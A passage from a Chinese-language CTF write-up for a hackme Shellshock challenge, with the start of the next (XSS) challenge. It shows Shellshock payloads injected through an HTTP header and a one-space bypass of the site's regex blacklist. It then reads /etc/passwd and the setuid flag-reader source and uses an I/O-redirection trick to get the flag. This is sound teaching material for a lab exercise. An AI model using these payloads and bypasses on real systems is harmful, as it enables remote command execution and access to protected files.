</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>drwxr-xr-x  <span style=color:#ff9f43>85</span> root root <span style=color:#ff9f43>4096</span> Jan <span style=color:#ff9f43>19</span>  <span style=color:#ff9f43>2018</span> etc
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>-r--------   <span style=color:#ff9f43>1</span> flag root   <span style=color:#ff9f43>37</span> Jan  <span style=color:#ff9f43>9</span>  <span style=color:#ff9f43>2018</span> flag <span style=color:#78787e># flag 在這</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>-rwsr-xr-x   <span style=color:#ff9f43>1</span> flag root <span style=color:#ff9f43>9080</span> Jan <span style=color:#ff9f43>19</span>  <span style=color:#ff9f43>2018</span> flag-reader <span style=color:#78787e># 奇怪的檔案</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>-rw-r--r--   <span style=color:#ff9f43>1</span> root root  <span style=color:#ff9f43>653</span> Jan  <span style=color:#ff9f43>9</span>  <span style=color:#ff9f43>2018</span> flag-reader.c <span style=color:#78787e># 疑似奇怪檔案的原始碼</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>drwxr-xr-x   <span style=color:#ff9f43>2</span> root root <span style=color:#ff9f43>4096</span> Apr <span style=color:#ff9f43>12</span>  <span style=color:#ff9f43>2016</span> home
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>-rwxr-xr-x   <span style=color:#ff9f43>1</span> root root  <span style=color:#ff9f43>100</span> Jan  <span style=color:#ff9f43>9</span>  <span style=color:#ff9f43>2018</span> init
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>drwxr-xr-x  <span style=color:#ff9f43>12</span> root root <span style=color:#ff9f43>4096</span> Jan <span style=color:#ff9f43>19</span>  <span style=color:#ff9f43>2018</span> lib
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>drwxr-xr-x   <span style=color:#ff9f43>2</span> root root <span style=color:#ff9f43>4096</span> Jan <span style=color:#ff9f43>19</span>  <span style=color:#ff9f43>2018</span> lib64
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>drwxr-xr-x   <span style=color:#ff9f43>2</span> root root <span style=color:#ff9f43>4096</span> May  <span style=color:#ff9f43>3</span>  <span style=color:#ff9f43>2016</span> media
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>drwxr-xr-x   <span style=color:#ff9f43>2</span> root root <span style=color:#ff9f43>4096</span> May  <span style=color:#ff9f43>3</span>  <span style=color:#ff9f43>2016</span> mnt
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>drwxr-xr-x   <span style=color:#ff9f43>2</span> root root <span style=color:#ff9f43>4096</span> May  <span style=color:#ff9f43>3</span>  <span style=color:#ff9f43>2016</span> opt
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>dr-xr-xr-x <span style=color:#ff9f43>386</span> root root    <span style=color:#ff9f43>0</span> Jan  <span style=color:#ff9f43>5</span> 14:34 proc
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>drwx------   <span style=color:#ff9f43>2</span> root root <span style=color:#ff9f43>4096</span> Feb <span style=color:#ff9f43>16</span>  <span style=color:#ff9f43>2018</span> root
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>drwxr-xr-x   <span style=color:#ff9f43>6</span> root root <span style=color:#ff9f43>4096</span> Feb <span style=color:#ff9f43>17</span>  <span style=color:#ff9f43>2019</span> run
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>drwxr-xr-x   <span style=color:#ff9f43>2</span> root root <span style=color:#ff9f43>4096</span> Jan <span style=color:#ff9f43>19</span>  <span style=color:#ff9f43>2018</span> sbin
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>drwxr-xr-x   <span style=color:#ff9f43>2</span> root root <span style=color:#ff9f43>4096</span> May  <span style=color:#ff9f43>3</span>  <span style=color:#ff9f43>2016</span> srv
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>dr-xr-xr-x  <span style=color:#ff9f43>13</span> root root    <span style=color:#ff9f43>0</span> Jan  <span style=color:#ff9f43>5</span> 14:34 sys
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span>drwxrwx-wt   <span style=color:#ff9f43>2</span> root root <span style=color:#ff9f43>4096</span> Feb  <span style=color:#ff9f43>3</span> 14:12 tmp
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span>drwxr-xr-x  <span style=color:#ff9f43>19</span> root root <span style=color:#ff9f43>4096</span> Feb <span style=color:#ff9f43>16</span>  <span style=color:#ff9f43>2018</span> usr
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span>drwxr-xr-x  <span style=color:#ff9f43>22</span> root root <span style=color:#ff9f43>4096</span> Jan <span style=color:#ff9f43>23</span>  <span style=color:#ff9f43>2018</span> var
</span></span></code></pre></div><p>看來<code>flag</code>又是無法直接讀取，但應該能透過執行<code>flag-reader</code>來讀取<code>flag</code>。<br>開始嘗試在 request 中把 payload 塞進 header：</p><p>個人習慣使用<code>burp</code>，請自行選擇方便使用的軟體來抓取封包：</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/37/2_huded3cc8c1e9adc7395a196086a089ea4_73719_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/37/2_huded3cc8c1e9adc7395a196086a089ea4_73719_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/37/2_huded3cc8c1e9adc7395a196086a089ea4_73719_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/37/2_huded3cc8c1e9adc7395a196086a089ea4_73719_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/37/2_huded3cc8c1e9adc7395a196086a089ea4_73719_660x0_resize_box_3.png alt style=width:100%></figure></p><p>塞入測試用的自訂檔頭<code>X-Hacker</code>其值為<code>() { :; }; echo "testing"</code>。</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/37/3_hu6492bc0c3df460d62e21a8360e25f222_54501_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/37/3_hu6492bc0c3df460d62e21a8360e25f222_54501_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/37/3_hu6492bc0c3df460d62e21a8360e25f222_54501_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/37/3_hu6492bc0c3df460d62e21a8360e25f222_54501_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/37/3_hu6492bc0c3df460d62e21a8360e25f222_54501_660x0_resize_box_3.png alt style=width:100%></figure></p><p>似乎被擋下來了，再回過頭去 view source code：</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#ff5c57>$black_list</span> <span style=color:#ff6ac1>=</span> [
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>    <span style=color:#5af78e>&#39;\/flag&#39;</span>, <span style=color:#5af78e>&#39;\(\)\s*\{\s*:;\s*\};&#39;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>];
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#ff6ac1>function</span> <span style=color:#57c7ff>waf</span>(<span style=color:#ff5c57>$a</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>    <span style=color:#ff6ac1>global</span> <span style=color:#ff5c57>$black_list</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>    <span style=color:#ff6ac1>if</span>(is_array(<span style=color:#ff5c57>$a</span>)) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>        <span style=color:#ff6ac1>foreach</span>(<span style=color:#ff5c57>$a</span> <span style=color:#ff6ac1>as</span> <span style=color:#ff5c57>$key</span> <span style=color:#ff6ac1>=&gt;</span> <span style=color:#ff5c57>$val</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>            waf(<span style=color:#ff5c57>$key</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>            waf(<span style=color:#ff5c57>$val</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>        }
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>    } <span style=color:#ff6ac1>else</span> {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>        <span style=color:#ff6ac1>foreach</span>(<span style=color:#ff5c57>$black_list</span> <span style=color:#ff6ac1>as</span> <span style=color:#ff5c57>$b</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>            <span style=color:#ff6ac1>if</span>(preg_match(<span style=color:#5af78e>&#34;/</span><span style=color:#5af78e>$b</span><span style=color:#5af78e>/&#34;</span>, <span style=color:#ff5c57>$a</span>) <span style=color:#ff6ac1>===</span> <span style=color:#ff9f43>1</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>                fuck(<span style=color:#5af78e>&#34;</span><span style=color:#5af78e>$b</span><span style=color:#5af78e> detected! exit now.&#34;</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>            }
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>        }
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>    }
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>waf(<span style=color:#ff5c57>$_SERVER</span>);
</span></span></code></pre></div><p>要想辦法繞過<code>'\(\)\s*\{\s*:;\s*\};'</code>。<br>但其實&mldr;這樣的防禦有跟沒有一樣，你只需要塞個空格給它，就繞過了。<br>把值改成<code>() { : ; }; echo "testing"</code>就成功執行了。</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/37/4_hu6bf3f704b2cf5480e1b0f09ab189fefe_77038_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/37/4_hu6bf3f704b2cf5480e1b0f09ab189fefe_77038_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/37/4_hu6bf3f704b2cf5480e1b0f09ab189fefe_77038_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/37/4_hu6bf3f704b2cf5480e1b0f09ab189fefe_77038_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/37/4_hu6bf3f704b2cf5480e1b0f09ab189fefe_77038_660x0_resize_box_3.png alt style=width:100%></figure></p><hr><p>到此已經拿到了 shell，但要怎麼把<code>flag</code>讀取並輸出？<br>由於權限不夠，無法直接<code>cat</code>，那麼先看看<code>flag-reader.c</code>裡頭到底寫了什麼。</p><p>payload「<code>() { : ; }; cat /flag-reader.c</code>」：</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/37/5_hub8897eb671c18bba19e07c9f2d170ad2_63839_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/37/5_hub8897eb671c18bba19e07c9f2d170ad2_63839_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/37/5_hub8897eb671c18bba19e07c9f2d170ad2_63839_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/37/5_hub8897eb671c18bba19e07c9f2d170ad2_63839_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/37/5_hub8897eb671c18bba19e07c9f2d170ad2_63839_660x0_resize_box_3.png alt style=width:100%></figure></p><p>跟前面一樣被擋下，但這並沒有意義，直接繞過即可。<br>嘗試「<code>() { : ; }; cat /fla?-reader.c</code>」卻發現什麼也沒執行，不知道為什麼無法直接輸入<code>cat</code>指令，但還是可以透過<code>/bin/cat</code>來執行。</p><p>所以 payload 改成「<code>() { : ; }; /bin/cat /fla?-reader.c</code>」。</p><p><code>flag-reader.c</code>：</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#78787e>#include</span> <span style=color:#78787e>&lt;unistd.h&gt;</span><span style=color:#78787e>
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#78787e>#include</span> <span style=color:#78787e>&lt;syscall.h&gt;</span><span style=color:#78787e>
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#78787e>#include</span> <span style=color:#78787e>&lt;fcntl.h&gt;</span><span style=color:#78787e>
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#78787e>#include</span> <span style=color:#78787e>&lt;string.h&gt;</span><span style=color:#78787e>
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#78787e></span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span><span style=color:#9aedfe>int</span> <span style=color:#57c7ff>main</span>(<span style=color:#9aedfe>int</span> argc, <span style=color:#9aedfe>char</span> <span style=color:#ff6ac1>*</span>argv[])
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>{
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span> <span style=color:#9aedfe>char</span> buff[<span style=color:#ff9f43>4096</span>], rnd[<span style=color:#ff9f43>16</span>], val[<span style=color:#ff9f43>16</span>];
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span> <span style=color:#ff6ac1>if</span>(<span style=color:#57c7ff>syscall</span>(SYS_getrandom, <span style=color:#ff6ac1>&amp;</span>rnd, <span style=color:#ff6ac1>sizeof</span>(rnd), <span style=color:#ff9f43>0</span>) <span style=color:#ff6ac1>!=</span> <span style=color:#ff6ac1>sizeof</span>(rnd)) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>  <span style=color:#57c7ff>write</span>(<span style=color:#ff9f43>1</span>, <span style=color:#5af78e>&#34;Not enough random</span><span style=color:#5af78e>\n</span><span style=color:#5af78e>&#34;</span>, <span style=color:#ff9f43>18</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span> }
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span> <span style=color:#57c7ff>setuid</span>(<span style=color:#ff9f43>1337</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span> <span style=color:#57c7ff>seteuid</span>(<span style=color:#ff9f43>1337</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span> <span style=color:#57c7ff>alarm</span>(<span style=color:#ff9f43>1</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span> <span style=color:#57c7ff>write</span>(<span style=color:#ff9f43>1</span>, <span style=color:#ff6ac1>&amp;</span>rnd, <span style=color:#ff6ac1>sizeof</span>(rnd));
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span> <span style=color:#57c7ff>read</span>(<span style=color:#ff9f43>0</span>, <span style=color:#ff6ac1>&amp;</span>val, <span style=color:#ff6ac1>sizeof</span>(val));
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span> <span style=color:#ff6ac1>if</span>(<span style=color:#57c7ff>memcmp</span>(rnd, val, <span style=color:#ff6ac1>sizeof</span>(rnd)) <span style=color:#ff6ac1>==</span> <span style=color:#ff9f43>0</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>  <span style=color:#9aedfe>int</span> fd <span style=color:#ff6ac1>=</span> <span style=color:#57c7ff>open</span>(argv[<span style=color:#ff9f43>1</span>], O_RDONLY);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>  <span style=color:#ff6ac1>if</span>(fd <span style=color:#ff6ac1>&gt;</span> <span style=color:#ff9f43>0</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span>   <span style=color:#9aedfe>int</span> s <span style=color:#ff6ac1>=</span> <span style=color:#57c7ff>read</span>(fd, buff, <span style=color:#ff9f43>1024</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span>   <span style=color:#ff6ac1>if</span>(s <span style=color:#ff6ac1>&gt;</span> <span style=color:#ff9f43>0</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span>    <span style=color:#57c7ff>write</span>(<span style=color:#ff9f43>1</span>, buff, s);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span>   }
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span>   <span style=color:#57c7ff>close</span>(fd);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span>  } <span style=color:#ff6ac1>else</span> {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28</span><span>   <span style=color:#57c7ff>write</span>(<span style=color:#ff9f43>1</span>, <span style=color:#5af78e>&#34;Can not open file</span><span style=color:#5af78e>\n</span><span style=color:#5af78e>&#34;</span>, <span style=color:#ff9f43>18</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29</span><span>  }
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30</span><span> } <span style=color:#ff6ac1>else</span> {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31</span><span>  <span style=color:#57c7ff>write</span>(<span style=color:#ff9f43>1</span>, <span style=color:#5af78e>&#34;Wrong response</span><span style=color:#5af78e>\n</span><span style=color:#5af78e>&#34;</span>, <span style=color:#ff9f43>16</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32</span><span> }
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33</span><span>}
</span></span></code></pre></div><p>一開始程式會有三個變數，分別是<code>buff[4096]</code>、<code>rnd[16]</code>及<code>val[16]</code>。<br>接著會開始生成隨機數並寫進<code>rnd</code>記憶體地址。</p><p>之後就調用了<code>setuid()</code>、<code>seteuid()</code>把使用者設定為<code>1337</code>。</p><p>我們可以用「<code>() { : ; }; /bin/cat /etc/passwd</code>」來查看<code>passwd</code>：</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>root:x:0:0:root:/root:/bin/bash
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span>.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span><span>.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5</span><span>flag:x:1337:1337::/home/flag:
</span></span></code></pre></div><p>會發現 id <code>1337</code>正是<code>/flag</code>這個檔案的擁有者，也叫做<code>flag</code>。</p><p>接著會將執行<code>write(1, &amp;rnd, sizeof(rnd))</code>產生的亂數輸出。<br>但接著下一行馬上執行<code>read(0, &amp;val, sizeof(val))</code>讀取<code>val</code>。<br>之後就判斷<code>rnd</code>及<code>val</code>是否相等，如果相等才會讀取檔案。</p><p>也就是說&mldr; 你需要在它輸出的一瞬間，將值輸入<code>val</code>。</p><p>這裡提供一個方法，就是用檔案來重定向<code>read</code>取代原本的<code>val</code>，只需要<code>program > file &lt; file</code>這樣的格式即可。</p><blockquote><p>在<code>shell</code>中，有幾種方式可以來針對輸出入做重定向。</p><ul><li><code>></code>輸出重定向，例如<code>echo "test" > file</code>，原本的<code>echo</code>會將結果輸出到螢幕上(<code>&amp;1</code>)，但因為我們使用<code>></code>來重新指定輸出到<code>file</code>，所以結果將會改成寫入<code>file</code>而非顯示在螢幕。</li><li><code>>></code>以<strong>append</strong>的方式輸出重定向，例如<code>echo "test" >> file</code>，則會在<code>file</code>後方加上<code>test</code>，而非覆蓋整個檔案。</li><li><code>&lt;</code>輸入重定向，舉例有個程式正在等待使用者輸入，你可以使用<code>program &lt; file</code>來自動的輸入<code>file</code>中的內容。它將原本等待使用者的輸入給定向到<code>file</code>。</li></ul><p>它們是可以混合運用的，舉例<code>program &lt; input > output</code>表示將<code>program</code>輸入重新定向到<code>input</code>中，並將輸出重定向到<code>output</code>。</p></blockquote><p>了解這些後可以開始嘗試了。</p><p>由於大部分目錄都沒有寫入權限，所以寫在<code>/var/tmp</code>中吧(大多時候這邊是可寫的)：<br>payload：<code>() { : ; }; cd /; fla?-reader fla? > /var/tmp/abc &lt; /var/tmp/abc</code>。</p><p>接著你可以在<code>/var/tmp/</code>中看到你重新定向輸出所寫入的檔案<code>abc</code>(居然也看得到別人的，還被 XSS = =)：</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/37/6_hu117e7f100b6f4a33407adc7d1ecaae8c_29430_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/37/6_hu117e7f100b6f4a33407adc7d1ecaae8c_29430_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/37/6_hu117e7f100b6f4a33407adc7d1ecaae8c_29430_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/37/6_hu117e7f100b6f4a33407adc7d1ecaae8c_29430_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/37/6_hu117e7f100b6f4a33407adc7d1ecaae8c_29430_660x0_resize_box_3.png alt style=width:100%></figure></p><p>之後再<code>() { : ; }; cd /; /bin/cat /var/tmp/abc</code>即可查看輸出內容：</p><p><figure><img class="my-0 rounded-md" loading=lazy srcset="/posts/ctf-hackme-web-write-up/37/7_huc4cf232dfe2e0cb0056319349c2bb23a_5613_330x0_resize_box_3.png 330w,
/posts/ctf-hackme-web-write-up/37/7_huc4cf232dfe2e0cb0056319349c2bb23a_5613_660x0_resize_box_3.png 660w,
/posts/ctf-hackme-web-write-up/37/7_huc4cf232dfe2e0cb0056319349c2bb23a_5613_1024x0_resize_box_3.png 1024w,
/posts/ctf-hackme-web-write-up/37/7_huc4cf232dfe2e0cb0056319349c2bb23a_5613_1320x0_resize_box_3.png 2x" src=/posts/ctf-hackme-web-write-up/37/7_huc4cf232dfe2e0cb0056319349c2bb23a_5613_660x0_resize_box_3.png alt style=width:100%></figure></p><p>前面的亂碼是隨機產生的亂數所組成的，有些是不可視字元，但足以看到後方的 flag 了。</p><p>Flag <code>FLAG{W0w U sh0cked m3 by 5h3115h0ck}</code></p><hr><h2 class="relative group">38. <a href=https://xssrf.hackme.quest/ target=_blank>xssme</a><div id=38-xssmehttpsxssrfhackmequest class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#38-xssmehttpsxssrfhackmequest aria-label=定位點>#</a></span></h2><blockquote><p>XSS admin to steal flag</p></blockquote><p><figure><img class="my-0 rounded-md" loading=lazy 